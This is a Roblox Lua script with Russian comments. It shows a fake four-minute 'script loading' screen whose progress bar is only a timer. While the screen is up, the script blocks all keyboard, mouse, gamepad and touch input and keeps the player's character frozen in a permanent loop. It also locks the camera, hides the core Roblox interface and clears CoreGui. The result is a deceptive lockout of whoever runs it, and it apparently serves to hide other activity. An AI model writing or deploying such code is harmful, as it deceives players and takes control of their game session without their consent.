local function visual()
    -- Ожидаем загрузки игры
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    local player = game.Players.LocalPlayer
    local PlayerGui = player:WaitForChild("PlayerGui")

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PurpleScrenGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = PlayerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BackgroundTransparency = 0
    blackFrame.ZIndex = 1
    blackFrame.Parent = screenGui
    
    -- ЭКРАН ЗАГРУЗКИ
    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0, 50)
    loadingText.Position = UDim2.new(0, 0, 0.3, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.Text = "ЗАГРУЗКА СКРИПТА... (4 МИНУТЫ)"
    loadingText.TextColor3 = Color3.new(1, 1, 1)
    loadingText.TextSize = 40
    loadingText.TextScaled = true
    loadingText.Font = Enum.Font.SourceSansBold
    loadingText.ZIndex = 2
    loadingText.Parent = screenGui
    
    -- Процент загрузки
    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(0, 100, 0, 30)
    percentText.Position = UDim2.new(0.5, -50, 0.4, 0)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.new(1, 1, 1)
    percentText.TextSize = 30
    percentText.Font = Enum.Font.SourceSansBold
    percentText.ZIndex = 2
    percentText.Parent = screenGui
    
    -- Прогресс-бар фон
    local progressBg = Instance.new("Frame")
    progressBg.Size = UDim2.new(0.6, 0, 0, 20)
    progressBg.Position = UDim2.new(0.2, 0, 0.5, 0)
    progressBg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    progressBg.BorderSizePixel = 0
    progressBg.ZIndex = 2
    progressBg.Parent = screenGui
    
    -- Прогресс-бар
    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.Position = UDim2.new(0, 0, 0, 0)
    progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
    progressBar.BorderSizePixel = 0
    progressBar.ZIndex = 3
    progressBar.Parent = progressBg
    
   
    -- Создаем спиннер загрузки
    local spinner = Instance.new("ImageLabel")
    spinner.Size = UDim2.new(0, 80, 0, 80)
    spinner.BackgroundTransparency = 1
    spinner.Image = "rbxassetid://11372558769" -- иконка загрузки
    spinner.ImageColor3 = Color3.new(1, 1, 1) -- белый
    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
    spinner.Position = UDim2.new(0.5, 0, 0.6, 0) -- под прогресс-баром
    spinner.ZIndex = 2
    spinner.Parent = screenGui

    -- Инициализируем переменную прогресса (глобальная для доступа из разных потоков)
    progress = 0
    
    -- Анимация спиннера
    task.spawn(function()
        while progress < 100 do
            pcall(function()
                spinner.Rotation = spinner.Rotation + 5
            end)
            task.wait(0.1)
        end
    end)
    
    -- Основной цикл загрузки
    task.spawn(function()
        while progress < 100 do
            pcall(function()
                -- Обновление прогресса (4 минуты = 240 секунд)
                progress = progress + 0.0417 -- 100% за 240 секунд (4 минуты)
                percentText.Text = math.floor(progress) .. "%"
                progressBar.Size = UDim2.new(progress/100, 0, 1, 0)
                
                -- Меняем цвет прогресс-бара
                if progress < 30 then
                    progressBar.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный
                elseif progress < 70 then
                    progressBar.BackgroundColor3 = Color3.new(1, 1, 0) -- Желтый
                else
                    progressBar.BackgroundColor3 = Color3.new(0, 1, 0) -- Зеленый
                end
            end)
            
            task.wait(0.1) -- Используем task.wait вместо wait для лучшей совместимости
        end
        
        pcall(function()
            -- Загрузка завершена
            loadingText.Text = "ЗАГРУЗКА ЗАВЕРШЕНА!"
            percentText.Text = "100%"
            progressBar.BackgroundColor3 = Color3.new(0, 1, 0)
            
            task.wait(2)
            
            -- Скрываем экран загрузки
            loadingText.Visible = false
            percentText.Visible = false
            progressBg.Visible = false
            spinner.Visible = false
        end)
    end)
    
    local CAS = game:GetService("ContextActionService")

    local function BlockAll(actionName, inputState, inputObject)
        return Enum.ContextActionResult.Sink
    end

    -- Блокируем все клавиши
    CAS:BindAction("BlockKeys", BlockAll, false, unpack(Enum.KeyCode:GetEnumItems()))
    -- Блокируем все типы ввода (мышь, тач, геймпад)
    CAS:BindAction("BlockInput", BlockAll, false, unpack(Enum.UserInputType:GetEnumItems()))
    
    -- ДОПОЛНИТЕЛЬНАЯ БЛОКИРОВКА КЛИЕНТА (РАБОТАЕТ НА ТЕЛЕФОНЕ)
    
    -- Блокируем движение персонажа
    local Players = game:GetService("Players")
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- Отключаем движение
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.PlatformStand = true
    
    -- Дополнительная блокировка движения
    task.spawn(function()
        while true do
            pcall(function()
                if character and character:FindFirstChild("Humanoid") then
                    character.Humanoid.WalkSpeed = 0
                    character.Humanoid.JumpPower = 0
                    character.Humanoid.PlatformStand = true
                end
            end)
            task.wait(0.1)
        end
    end)
    
    -- Блокируем камеру
    local Camera = workspace.CurrentCamera
    Camera.CameraType = Enum.CameraType.Scriptable
    
    -- Отключаем весь интерфейс Roblox
    local StarterGui = game:GetService("StarterGui")
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    
    -- БЛОКИРОВКА ДЛЯ ТЕЛЕФОНА
    local UserInputService = game:GetService("UserInputService")
    
    -- Блокируем все типы ввода на мобильных устройствах
    pcall(function()
        UserInputService.TouchEnabled = false
    end)
    
    -- Дополнительная блокировка для мобильных устройств
    local function blockTouchInput(inputObject, gameProcessed)
        if inputObject.UserInputType == Enum.UserInputType.Touch then
            return Enum.ContextActionResult.Sink
        end
        return Enum.ContextActionResult.Pass
    end
    
    -- Блокируем касания экрана
    UserInputService.InputBegan:Connect(function(inputObject, gameProcessed)
        if inputObject.UserInputType == Enum.UserInputType.Touch then
            return Enum.ContextActionResult.Sink
        end
    end)
    
    -- Блокируем все жесты на мобильных устройствах
    UserInputService.TouchTapInWorld:Connect(function()
        return Enum.ContextActionResult.Sink
    end)
    
    -- Блокируем поворот экрана
    UserInputService.DeviceOrientationChanged:Connect(function()
        return Enum.ContextActionResult.Sink
    end)
end

-- Запускаем функцию с обработкой ошибок
pcall(function()
    visual()
end)

-- Очищаем CoreGui после запуска
pcall(function()
    game:GetService('CoreGui'):ClearAllChildren()
end)
